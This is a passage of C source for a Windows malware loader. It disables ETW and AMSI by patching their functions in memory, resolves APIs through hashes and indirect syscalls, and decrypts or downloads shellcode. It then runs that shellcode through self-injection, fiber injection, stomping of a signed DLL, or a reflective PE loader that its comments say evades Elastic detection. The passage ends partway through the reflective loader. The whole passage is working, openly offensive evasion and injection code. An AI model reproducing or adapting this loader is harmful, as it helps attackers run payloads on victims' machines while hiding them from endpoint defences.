        FARPROC pEtw = R(HMOD_NTDLL, HF_EtwEventWrite);
        if (pEtw) {
            typedef BOOL (WINAPI *t_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
            t_VP pVP = (t_VP)R(HMOD_KERNEL32, HF_VirtualProtect);
            if (pVP) {
                static const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
                DWORD old;
                if (pVP((LPVOID)pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
                    memcpy((void *)pEtw, patch, sizeof(patch));
                    pVP((LPVOID)pEtw, sizeof(patch), old, &old);
                    DBG("[3] ETW patched");
                } else { DBG("[WARN] ETW VirtualProtect failed"); }
            }
        } else { DBG("[WARN] EtwEventWrite not found"); }
    }
#endif /* USE_ETW_PATCH */

    /* AMSI patch: xor eax,eax; ret */
#ifdef USE_AMSI_PATCH
    {
        typedef HMODULE (WINAPI *t_LLA)(LPCSTR);
        t_LLA pLLA = (t_LLA)R(HMOD_KERNEL32, HF_LoadLibraryA);
        if (pLLA) {
            const char amsi_dll[] = {'a','m','s','i','.','d','l','l','\0'};
            HMODULE hAmsi = (HMODULE)peb_module(HMOD_AMSI);
            if (!hAmsi) hAmsi = pLLA(amsi_dll);
            if (hAmsi) {
                FARPROC pASB = resolve(hAmsi, HF_AmsiScanBuffer);
                if (pASB) {
                    typedef BOOL (WINAPI *t_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
                    t_VP pVP = (t_VP)R(HMOD_KERNEL32, HF_VirtualProtect);
                    if (pVP) {
                        static const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
                        DWORD old;
                        if (pVP((LPVOID)pASB, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
                            memcpy((void *)pASB, patch, sizeof(patch));
                            pVP((LPVOID)pASB, sizeof(patch), old, &old);
                            DBG("[4] AMSI patched");
                        } else { DBG("[WARN] AMSI VirtualProtect failed"); }
                    }
                } else { DBG("[WARN] AmsiScanBuffer not found"); }
            } else { DBG("[WARN] amsi.dll not loaded"); }
        }
    }
#endif /* USE_AMSI_PATCH */

    /* Resolve all Nt* from ntdll (no forwarded exports, actual syscall stubs) */
    typedef NTSTATUS (NTAPI *t_NtAVM)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
    typedef NTSTATUS (NTAPI *t_NtFVM)(HANDLE,PVOID*,PSIZE_T,ULONG);
    typedef NTSTATUS (NTAPI *t_NtWVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
    typedef NTSTATUS (NTAPI *t_NtPVM)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
    typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
    typedef NTSTATUS (NTAPI *t_NtRT) (HANDLE,PULONG);

    HMODULE hNtdll = peb_module(HMOD_NTDLL);
#ifdef USE_HELLSHALL
    /* HellsHall: define shim lambdas so the rest of the code compiles unchanged */
    auto pNtAVM = [](HANDLE h, PVOID *b, ULONG_PTR zb, PSIZE_T sz, ULONG t, ULONG p) {
        return hg_NtAllocateVirtualMemory(h, b, zb, sz, t, p); };
    auto pNtFVM = [](HANDLE h, PVOID *b, PSIZE_T sz, ULONG t) {
        return hg_NtFreeVirtualMemory(h, b, sz, t); };
    auto pNtWVM = [](HANDLE h, PVOID a, PVOID buf, SIZE_T sz, PSIZE_T wr) {
        return hg_NtWriteVirtualMemory(h, a, buf, sz, wr); };
    auto pNtPVM = [](HANDLE h, PVOID *b, PSIZE_T sz, ULONG p, PULONG o) {
        return hg_NtProtectVirtualMemory(h, b, sz, p, o); };
    auto pNtRT  = [](HANDLE h, PULONG p) { return hg_NtResumeThread(h, p); };
    (void)hNtdll;
    DBG("[HH] HellsHall wrappers active for Nt* calls");
#else
    t_NtAVM pNtAVM = (t_NtAVM)resolve(hNtdll, HF_NtAllocateVirtualMemory);
    t_NtFVM pNtFVM = (t_NtFVM)resolve(hNtdll, HF_NtFreeVirtualMemory);
    t_NtWVM pNtWVM = (t_NtWVM)resolve(hNtdll, HF_NtWriteVirtualMemory);
    t_NtPVM pNtPVM = (t_NtPVM)resolve(hNtdll, HF_NtProtectVirtualMemory);
    t_NtRT  pNtRT  = (t_NtRT) resolve(hNtdll, HF_NtResumeThread);

    if (!pNtAVM || !pNtFVM || !pNtWVM || !pNtPVM || !pNtRT) {
        DBG("[FAIL] Nt* API resolution failed"); return 1;
    }
#endif

    /* Fetch or allocate shellcode */
    unsigned char *sc = NULL;
    SIZE_T sc_sz = 0;

#ifdef USE_STAGER
    {
        size_t fetched = 0;
        unsigned char *raw = stager_fetch(&fetched);
        if (!raw || fetched == 0) { DBG("[FAIL] stager_fetch returned NULL/0"); return 1; }
        sc_sz = fetched;
        typedef LPVOID (WINAPI *t_VA)(LPVOID,SIZE_T,DWORD,DWORD);
        t_VA pVA = (t_VA)RK32(HF_VirtualAlloc);
        sc = pVA ? (unsigned char *)pVA(NULL, sc_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
        if (!sc) { DBG("[FAIL] VirtualAlloc for stager sc failed"); return 1; }
        memcpy(sc, raw, sc_sz);
        { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(raw,0,MEM_RELEASE); }
        rc4_crypt(_stager_key, sizeof(_stager_key), sc, sc_sz);
        DBG("[5] Stager: downloaded and decrypted");
    }
#else /* embedded payload */
    sc_sz = payload_size;
#if defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
    {
        typedef LPVOID (WINAPI *t_VA)(LPVOID, SIZE_T, DWORD, DWORD);
        t_VA pVA = (t_VA)RK32(HF_VirtualAlloc);
        if (pVA) sc = (unsigned char *)pVA(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!sc) { DBG("[FAIL] VirtualAlloc failed"); return 1; }
#else
    {
        NTSTATUS stLocal = pNtAVM((HANDLE)-1, (PVOID*)&sc, 0, &sc_sz,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!sc) { DBG("[FAIL] local NtAVM alloc failed"); return 1; }
    }
#endif

#ifdef USE_UUID
    for (size_t i = 0; i < g_uuid_count; i++)
        uuid_decode(g_payload_uuids[i], sc + i * 16);
    DBG_VAL("[5] UUID payload decoded, size", (unsigned long long)payload_size);
#else
    memcpy(sc, payload, payload_size);
    memset(payload, 0, payload_size);
    DBG_VAL("[5] Payload copied, size", (unsigned long long)payload_size);
#ifdef USE_RC4
    rc4_crypt(rc4_key, sizeof(rc4_key), sc, payload_size);
    DBG("[6] RC4 decryption done");
#elif defined(USE_XOR)
    xor_crypt(sc, payload_size);
    DBG("[6] XOR decryption done");
#else
    DBG("[6] No decryption (plaintext)");
#endif
#endif /* USE_UUID */
#endif /* USE_STAGER else */

#ifdef USE_SELF_INJECT
    /* Self-injection: execute shellcode in current process */
    {
        typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
        typedef NTSTATUS (NTAPI *t_NtWSO)(HANDLE,BOOLEAN,PLARGE_INTEGER);
        typedef BOOL (WINAPI *t_CH)(HANDLE);
        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
        t_NtWSO pNtWSO = (t_NtWSO)resolve(hNtdll, HF_NtWaitForSingleObject);
        t_CH    pCH    = (t_CH)  RK32(HF_CloseHandle);
        if (!pNtCTE) {
            DBG("[FAIL] SelfInject: NtCreateThreadEx not found");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        PVOID  prot_base = sc;
        SIZE_T prot_sz   = sc_sz;
        ULONG  old_prot  = 0;
        pNtPVM((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READWRITE, &old_prot);
        DBG("[SI1] Self RWX via NtProtectVirtualMemory");
        HANDLE hSIThread = NULL;
        NTSTATUS stSI = pNtCTE(&hSIThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, sc, NULL, 0, 0, 0, 0, NULL);
        DBG_HEX("[SI2] NtCreateThreadEx status", (unsigned long long)(ULONG)stSI);
        if (hSIThread) {
            LARGE_INTEGER si_to = {0};
            si_to.QuadPart = -50000000LL; /* 5 seconds */
            NTSTATUS stW = pNtWSO(hSIThread, FALSE, &si_to);
            if ((ULONG)stW == 0x00000102UL) {
                DBG("[SI3] Thread alive after 5s - Donut/Kratos running in-process, waiting 30s more...");
                LARGE_INTEGER si_to2 = {0};
                si_to2.QuadPart = -300000000LL; /* 30 seconds */
                pNtWSO(hSIThread, FALSE, &si_to2);
                DBG("[SI4] 35s total wait complete");
            } else {
                DBG_HEX("[SI3] Thread exited early (Donut crash or WinMain returned)", (unsigned long long)(ULONG)stW);
            }
            if (pCH) pCH(hSIThread);
        }
    }
#elif defined(USE_FIBER_INJECT)
    /* Fiber injection: shellcode via fiber switch (no thread creation) */
    {
        DBG("[FI] === FIBER INJECTION MODE ===");
        typedef LPVOID (WINAPI *t_CTTF)(LPVOID);
        typedef LPVOID (WINAPI *t_CF)  (SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
        typedef void   (WINAPI *t_STF) (LPVOID);
        typedef BOOL   (WINAPI *t_DF)  (LPVOID);
        t_CTTF pCTTF = (t_CTTF)RK32(HF_ConvertThreadToFiber);
        t_CF   pCF   = (t_CF)  RK32(HF_CreateFiber);
        t_STF  pSTF  = (t_STF) RK32(HF_SwitchToFiber);
        t_DF   pDF   = (t_DF)  RK32(HF_DeleteFiber);
        DBG_HEX("[FI1] ConvertThreadToFiber resolved", (unsigned long long)(ULONG_PTR)pCTTF);
        DBG_HEX("[FI1] CreateFiber resolved", (unsigned long long)(ULONG_PTR)pCF);
        DBG_HEX("[FI1] SwitchToFiber resolved", (unsigned long long)(ULONG_PTR)pSTF);
        if (!pCTTF || !pCF || !pSTF) {
            DBG("[FAIL] FiberInject: API resolution failed");
            { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }
            return 1;
        }
        /* sc already decrypted and RW - change to RX via NtProtectVirtualMemory (avoids VirtualProtect hook) */
        DBG_HEX("[FI2] shellcode addr", (unsigned long long)(ULONG_PTR)sc);
        DBG_VAL("[FI2] shellcode size", (unsigned long long)sc_sz);
        {
            PVOID base = (PVOID)sc;
            SIZE_T sz = (SIZE_T)sc_sz;
            ULONG old_fi = 0;
            pNtPVM((HANDLE)-1, &base, &sz, PAGE_EXECUTE_READ, &old_fi);
        }
        DBG("[FI3] Self RW -> RX via NtProtectVirtualMemory done");
        LPVOID mainFiber = pCTTF(NULL);
        if (!mainFiber) {
            DBG("[FAIL] FiberInject: ConvertThreadToFiber failed (GetLastError may help)");
            return 1;
        }
        DBG_HEX("[FI4] mainFiber handle", (unsigned long long)(ULONG_PTR)mainFiber);
        LPVOID scFiber = pCF(0x800000, (LPFIBER_START_ROUTINE)sc, NULL);
        if (!scFiber) {
            DBG("[FAIL] FiberInject: CreateFiber failed");
            return 1;
        }
        DBG_HEX("[FI5] scFiber handle", (unsigned long long)(ULONG_PTR)scFiber);
        /* Run shellcode via NtCreateThreadEx for lifecycle diagnostics */
        typedef NTSTATUS (NTAPI *t_NtCTE_FI)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
        typedef NTSTATUS (NTAPI *t_NtWSO_FI)(HANDLE,BOOLEAN,PLARGE_INTEGER);
        t_NtCTE_FI pNtCTE_FI = (t_NtCTE_FI)resolve(hNtdll, HF_NtCreateThreadEx);
        t_NtWSO_FI pNtWSO_FI = (t_NtWSO_FI)resolve(hNtdll, HF_NtWaitForSingleObject);
        HANDLE hFIThread = NULL;
        if (pNtCTE_FI) {
            NTSTATUS stFI = pNtCTE_FI(&hFIThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, sc, NULL, 0, 0, 0, 0, NULL);
            DBG_HEX("[FI6] NtCreateThreadEx status", (unsigned long long)(ULONG)stFI);
        }
        if (hFIThread && pNtWSO_FI) {
            LARGE_INTEGER fi_to = {0};
            fi_to.QuadPart = -50000000LL;
            NTSTATUS stW = pNtWSO_FI(hFIThread, FALSE, &fi_to);
            if ((ULONG)stW == 0x00000102UL) {
                DBG("[FI7] Thread alive 5s - Donut/Kratos running, waiting 30s more...");
                LARGE_INTEGER fi_to2 = {0};
                fi_to2.QuadPart = -300000000LL;
                pNtWSO_FI(hFIThread, FALSE, &fi_to2);
                DBG("[FI8] 35s total elapsed");
            } else {
                DBG_HEX("[FI7] Thread exited early (crash or ExitProcess)", (unsigned long long)(ULONG)stW);
            }
            if (pDF) pDF(scFiber);
            if (pCTTF) {} /* fiber created but unused - shellcode ran via thread */
            typedef BOOL (WINAPI *t_CH_FI)(HANDLE);
            t_CH_FI pCH_FI = (t_CH_FI)RK32(HF_CloseHandle);
            if (pCH_FI) pCH_FI(hFIThread);
        }
    }
#elif defined(USE_MODULE_STOMP)
    /* Module stomping: map sacrificial DLL via NtCreateSection+NtMapViewOfSection,
       write shellcode into its .text section, execute via fiber.
       Shellcode runs from image-backed memory (signed DLL), all Nt* calls from
       the shellcode appear to come from the signed DLL. */
    {
        DBG("[MS] === MODULE STOMPING + FIBER MODE ===");

        typedef NTSTATUS (NTAPI *t_NtCS)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
        typedef NTSTATUS (NTAPI *t_NtMVS)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
        typedef LPVOID   (WINAPI *t_CTTF)(LPVOID);
        typedef LPVOID   (WINAPI *t_CF)  (SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
        typedef void     (WINAPI *t_STF) (LPVOID);
        typedef BOOL     (WINAPI *t_VP2) (LPVOID, SIZE_T, DWORD, PDWORD);
        typedef BOOL     (WINAPI *t_CH)  (HANDLE);

#ifdef USE_HELLSHALL
        auto pNtCS = [](PHANDLE h, ACCESS_MASK a, POBJECT_ATTRIBUTES o, PLARGE_INTEGER ms, ULONG pp, ULONG sa, HANDLE hf) {
            return hg_NtCreateSection(h, a, (PVOID)o, ms, pp, sa, hf); };
        auto pNtMVS = [](HANDLE hs, HANDLE hp, PVOID *b, ULONG_PTR zb, SIZE_T c, PLARGE_INTEGER off, PSIZE_T vs, DWORD inh, ULONG at, ULONG p) {
            return hg_NtMapViewOfSection(hs, hp, b, zb, c, off, vs, inh, at, p); };
#else
        t_NtCS  pNtCS  = (t_NtCS)  resolve(hNtdll, HF_NtCreateSection);
        t_NtMVS pNtMVS = (t_NtMVS) resolve(hNtdll, HF_NtMapViewOfSection);
#endif
        t_CTTF  pCTTF  = (t_CTTF)  RK32(HF_ConvertThreadToFiber);
        t_CF    pCF    = (t_CF)    RK32(HF_CreateFiber);
        t_STF   pSTF   = (t_STF)   RK32(HF_SwitchToFiber);
        t_VP2   pVP2   = (t_VP2)   RK32(HF_VirtualProtect);
        t_CH    pCH    = (t_CH)    RK32(HF_CloseHandle);

        if (!pNtCS || !pNtMVS || !pCTTF || !pCF || !pSTF || !pVP2) {
            DBG("[FAIL] ModuleStomp: API resolution failed");
            { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }
            return 1;
        }

        /* Sacrificial DLL path on stack (no string literal in binary) */
        const char dll_path[] = {
            'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\',
            'c','o','m','b','a','s','e','.','d','l','l','\0'
        };

        /* Open DLL file */
        typedef HANDLE (WINAPI *t_CFA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
        t_CFA pCFA2 = (t_CFA)R(HMOD_KERNEL32, HF_CreateFileA);
        if (!pCFA2) { DBG("[FAIL] ModuleStomp: CreateFileA not found"); return 1; }

        HANDLE hFile = pCFA2(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) { DBG("[FAIL] ModuleStomp: CreateFileA failed"); return 1; }
        DBG("[MS1] DLL file opened");

        /* Create image section (SEC_IMAGE = 0x1000000) */
        HANDLE hSection = NULL;
        NTSTATUS stCS = pNtCS(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, 0x1000000, hFile);
        if (pCH) pCH(hFile);
        if (!NT_SUCCESS(stCS) || !hSection) {
            DBG_HEX("[FAIL] ModuleStomp: NtCreateSection failed", (unsigned long long)(ULONG)stCS);
            return 1;
        }
        DBG("[MS2] Image section created");

        /* Map view into current process as RWX */
        PVOID pDll = NULL;
        SIZE_T viewSz = 0;
        NTSTATUS stMVS = pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1 /*ViewShare*/, 0, PAGE_EXECUTE_WRITECOPY);
        if (pCH) pCH(hSection);
        if (!NT_SUCCESS(stMVS) || !pDll) {
            /* Retry with PAGE_EXECUTE_READWRITE if WRITECOPY not supported */
            pDll = NULL; viewSz = 0;
            pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1, 0, PAGE_READWRITE);
        }
        if (!pDll) { DBG("[FAIL] ModuleStomp: NtMapViewOfSection failed"); return 1; }
        DBG_HEX("[MS3] DLL mapped at", (unsigned long long)(ULONG_PTR)pDll);
        DBG_VAL("[MS3] view size", (unsigned long long)viewSz);

        /* Find the .text section entry point in the mapped DLL */
        BYTE *base = (BYTE *)pDll;
        IMAGE_NT_HEADERS *nt_hdr = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
        ULONG_PTR entryPt = (ULONG_PTR)base + nt_hdr->OptionalHeader.AddressOfEntryPoint;
        DBG_HEX("[MS4] DLL entry point", (unsigned long long)entryPt);

        /* Find .text section to verify size */
        IMAGE_SECTION_HEADER *sec_hdr = IMAGE_FIRST_SECTION(nt_hdr);
        SIZE_T text_sz = 0;
        ULONG_PTR text_va = 0;
        for (WORD i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++, sec_hdr++) {
            if (memcmp(sec_hdr->Name, ".text", 5) == 0) {
                text_va = (ULONG_PTR)base + sec_hdr->VirtualAddress;
                text_sz = sec_hdr->Misc.VirtualSize;
                break;
            }
        }
        DBG_VAL("[MS5] .text size", (unsigned long long)text_sz);
        DBG_VAL("[MS5] payload size", (unsigned long long)sc_sz);

        /* If payload fits in .text starting from entry point, use entry point.
           Otherwise use beginning of .text section. */
        ULONG_PTR inject_addr = entryPt;
        if (text_va && text_sz > sc_sz) {
            SIZE_T space_from_ep = text_sz - (entryPt - text_va);
            if (space_from_ep < sc_sz) {
                inject_addr = text_va;
                DBG("[MS5] Using .text base (entry point too close to end)");
            }
        } else if (text_va && text_sz > sc_sz) {
            inject_addr = text_va;
        }
        DBG_HEX("[MS6] Injection address", (unsigned long long)inject_addr);

        /* Force RWX on the target range before writing (WRITECOPY mapping may still be RX on some Windows versions) */
        DWORD old_ms = 0;
        pVP2((PVOID)inject_addr, sc_sz, PAGE_EXECUTE_READWRITE, &old_ms);
        DBG("[MS6a] VirtualProtect -> RWX");
        memcpy((void *)inject_addr, sc, sc_sz);
        DBG("[MS7] Shellcode written to DLL .text");
        pVP2((PVOID)inject_addr, sc_sz, PAGE_EXECUTE_READ, &old_ms);
        DBG("[MS7a] VirtualProtect -> RX");

#ifdef USE_WIPE
        memset(sc, 0, sc_sz);
#endif
        /* Free local decryption buffer via VirtualFree */
        { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }

        /* Execute shellcode in DLL-backed memory via thread (lifecycle diagnostic) */
        typedef NTSTATUS (NTAPI *t_NtCTE_MS)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
        typedef NTSTATUS (NTAPI *t_NtWSO_MS)(HANDLE,BOOLEAN,PLARGE_INTEGER);
        t_NtCTE_MS pNtCTE_MS = (t_NtCTE_MS)resolve(hNtdll, HF_NtCreateThreadEx);
        t_NtWSO_MS pNtWSO_MS = (t_NtWSO_MS)resolve(hNtdll, HF_NtWaitForSingleObject);
        DBG("[MS9] Launching thread in stomped DLL memory...");
        HANDLE hMSThread = NULL;
        if (pNtCTE_MS) {
            NTSTATUS stMS = pNtCTE_MS(&hMSThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (PVOID)inject_addr, NULL, 0, 0, 0, 0, NULL);
            DBG_HEX("[MS10] NtCreateThreadEx status", (unsigned long long)(ULONG)stMS);
        }
        if (hMSThread && pNtWSO_MS) {
            LARGE_INTEGER ms_to = {0};
            ms_to.QuadPart = -50000000LL;
            NTSTATUS stW = pNtWSO_MS(hMSThread, FALSE, &ms_to);
            if ((ULONG)stW == 0x00000102UL) {
                DBG("[MS11] Thread alive 5s - Donut/Kratos running, waiting 30s more...");
                LARGE_INTEGER ms_to2 = {0};
                ms_to2.QuadPart = -300000000LL;
                pNtWSO_MS(hMSThread, FALSE, &ms_to2);
                DBG("[MS12] 35s total elapsed");
            } else {
                DBG_HEX("[MS11] Thread exited early (crash or ExitProcess)", (unsigned long long)(ULONG)stW);
            }
            typedef BOOL (WINAPI *t_CH_MS)(HANDLE);
            t_CH_MS pCH_MS = (t_CH_MS)RK32(HF_CloseHandle);
            if (pCH_MS) pCH_MS(hMSThread);
        }
    }
#elif defined(USE_REFLECTIVE_LOAD)
    /* Reflective PE loader: maps Kratos PE via NtCreateSection+NtMapViewOfSection.
       Resulting memory type is MEM_MAPPED (not MEM_PRIVATE/VirtualAlloc), which
       bypasses "Unbacked Shellcode from Unsigned Module" Elastic detection. */
    {
        DBG("[RL] === REFLECTIVE PE LOAD (MEM_MAPPED via NtCreateSection) ===");

        IMAGE_DOS_HEADER *rl_dos = (IMAGE_DOS_HEADER *)sc;
        if (rl_dos->e_magic != 0x5A4D) { DBG("[FAIL] RL: not a PE"); return 1; }
        IMAGE_NT_HEADERS *rl_nt = (IMAGE_NT_HEADERS *)(sc + rl_dos->e_lfanew);
        if (rl_nt->Signature != 0x4550) { DBG("[FAIL] RL: bad NT sig"); return 1; }
        SIZE_T rl_img_sz = rl_nt->OptionalHeader.SizeOfImage;

        typedef NTSTATUS (NTAPI *t_NtCS2)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
        typedef NTSTATUS (NTAPI *t_NtMVS2)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG);
        typedef BOOL     (WINAPI *t_CH2)(HANDLE);
#ifdef USE_HELLSHALL
        auto pNtCS2 = [](PHANDLE h, ACCESS_MASK a, PVOID o, PLARGE_INTEGER ms, ULONG pp, ULONG sa, HANDLE hf) {
            return hg_NtCreateSection(h, a, o, ms, pp, sa, hf); };
        auto pNtMVS2 = [](HANDLE hs, HANDLE hp, PVOID *b, ULONG_PTR zb, SIZE_T c, PLARGE_INTEGER off, PSIZE_T vs, ULONG inh, ULONG at, ULONG p) {
            return hg_NtMapViewOfSection(hs, hp, b, zb, c, off, vs, (DWORD)inh, at, p); };
#else
        t_NtCS2  pNtCS2  = (t_NtCS2)  resolve(hNtdll, HF_NtCreateSection);
        t_NtMVS2 pNtMVS2 = (t_NtMVS2) resolve(hNtdll, HF_NtMapViewOfSection);
        if (!pNtCS2 || !pNtMVS2) { DBG("[FAIL] RL: Nt* not found"); return 1; }
#endif
        t_CH2    pCH2    = (t_CH2)    RK32(HF_CloseHandle);

        HANDLE rl_hSec = NULL;
        LARGE_INTEGER rl_sz = {0};
        rl_sz.QuadPart = (LONGLONG)rl_img_sz;
        NTSTATUS stCS2 = pNtCS2(&rl_hSec, SECTION_ALL_ACCESS, NULL, &rl_sz,
                                 PAGE_EXECUTE_READWRITE, 0x8000000 /*SEC_COMMIT*/, NULL);
        DBG_HEX("[RL1] NtCreateSection status", (unsigned long long)(ULONG)stCS2);
        if (stCS2 != 0 || !rl_hSec) { DBG("[FAIL] RL: NtCreateSection failed"); return 1; }

        PVOID rl_base = NULL;
        SIZE_T rl_view = 0;
        NTSTATUS stMVS2 = pNtMVS2(rl_hSec, (HANDLE)-1, &rl_base, 0, 0, NULL,
                                   &rl_view, 1 /*ViewShare*/, 0, PAGE_EXECUTE_READWRITE);
        if (pCH2) pCH2(rl_hSec);
        DBG_HEX("[RL2] NtMapViewOfSection status", (unsigned long long)(ULONG)stMVS2);
        if (stMVS2 != 0 || !rl_base) { DBG("[FAIL] RL: NtMapViewOfSection failed"); return 1; }
        DBG_HEX("[RL2] Mapped at", (unsigned long long)(ULONG_PTR)rl_base);

        /* Copy PE headers */
        memcpy(rl_base, sc, rl_nt->OptionalHeader.SizeOfHeaders);

        /* Copy sections */
        IMAGE_SECTION_HEADER *rl_sec = IMAGE_FIRST_SECTION(rl_nt);
        for (WORD rl_i = 0; rl_i < rl_nt->FileHeader.NumberOfSections; rl_i++, rl_sec++) {
            if (rl_sec->SizeOfRawData > 0 && rl_sec->PointerToRawData > 0) {
                memcpy((BYTE*)rl_base + rl_sec->VirtualAddress,
                       sc + rl_sec->PointerToRawData, rl_sec->SizeOfRawData);
            }
        }

        /* Free intermediate buffer - PE now lives in MEM_MAPPED region only */
        { typedef BOOL (WINAPI *t_VF2)(LPVOID,SIZE_T,DWORD); t_VF2 pVF2=(t_VF2)RK32(HF_VirtualFree); if(pVF2) pVF2(sc,0,MEM_RELEASE); }
        sc = NULL;

        /* Fix base relocations */
        IMAGE_NT_HEADERS *rl_nt2 = (IMAGE_NT_HEADERS *)((BYTE*)rl_base + ((IMAGE_DOS_HEADER*)rl_base)->e_lfanew);
        ULONG_PTR rl_delta = (ULONG_PTR)rl_base - (ULONG_PTR)rl_nt2->OptionalHeader.ImageBase;
        if (rl_delta != 0) {
            IMAGE_DATA_DIRECTORY *rl_rd = &rl_nt2->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (rl_rd->VirtualAddress && rl_rd->Size) {
                IMAGE_BASE_RELOCATION *rl_rel = (IMAGE_BASE_RELOCATION *)((BYTE*)rl_base + rl_rd->VirtualAddress);
                while (rl_rel->VirtualAddress && rl_rel->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                    DWORD rl_cnt = (rl_rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    WORD *rl_ent = (WORD*)((BYTE*)rl_rel + sizeof(IMAGE_BASE_RELOCATION));
                    for (DWORD rl_k = 0; rl_k < rl_cnt; rl_k++) {
                        if ((rl_ent[rl_k] >> 12) == IMAGE_REL_BASED_DIR64) {
                            *(ULONG_PTR*)((BYTE*)rl_base + rl_rel->VirtualAddress + (rl_ent[rl_k] & 0xFFF)) += rl_delta;
                        } else if ((rl_ent[rl_k] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                            *(DWORD*)((BYTE*)rl_base + rl_rel->VirtualAddress + (rl_ent[rl_k] & 0xFFF)) += (DWORD)rl_delta;
                        }
                    }
                    rl_rel = (IMAGE_BASE_RELOCATION*)((BYTE*)rl_rel + rl_rel->SizeOfBlock);
                }
            }
        }
        DBG("[RL3] Relocations fixed");

        /* Fix IAT */
        typedef HMODULE (WINAPI *t_LLA2)(LPCSTR);
        typedef FARPROC (WINAPI *t_GPA2)(HMODULE, LPCSTR);
        t_LLA2 pLLA2 = (t_LLA2)RK32(HF_LoadLibraryA);
        t_GPA2 pGPA2 = (t_GPA2)RK32(HF_GetProcAddress);
        IMAGE_DATA_DIRECTORY *rl_imp_dd = &rl_nt2->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (pLLA2 && pGPA2 && rl_imp_dd->VirtualAddress && rl_imp_dd->Size) {
            IMAGE_IMPORT_DESCRIPTOR *rl_imp = (IMAGE_IMPORT_DESCRIPTOR *)((BYTE*)rl_base + rl_imp_dd->VirtualAddress);
            while (rl_imp->Name) {
                HMODULE rl_hMod = pLLA2((LPCSTR)((BYTE*)rl_base + rl_imp->Name));
                if (rl_hMod) {
                    ULONG_PTR *rl_thunk = (ULONG_PTR*)((BYTE*)rl_base + rl_imp->FirstThunk);
                    ULONG_PTR *rl_orig  = (ULONG_PTR*)((BYTE*)rl_base + (rl_imp->OriginalFirstThunk ? rl_imp->OriginalFirstThunk : rl_imp->FirstThunk));
                    while (*rl_orig) {
                        if (*rl_orig & IMAGE_ORDINAL_FLAG64) {
                            *rl_thunk = (ULONG_PTR)pGPA2(rl_hMod, (LPCSTR)(*rl_orig & 0xFFFF));
                        } else {
                            IMAGE_IMPORT_BY_NAME *rl_ibn = (IMAGE_IMPORT_BY_NAME *)((BYTE*)rl_base + *rl_orig);
                            *rl_thunk = (ULONG_PTR)pGPA2(rl_hMod, (LPCSTR)rl_ibn->Name);
                        }
                        rl_thunk++; rl_orig++;
                    }
                }
                rl_imp++;
            }
        }
        DBG("[RL4] IAT resolved");

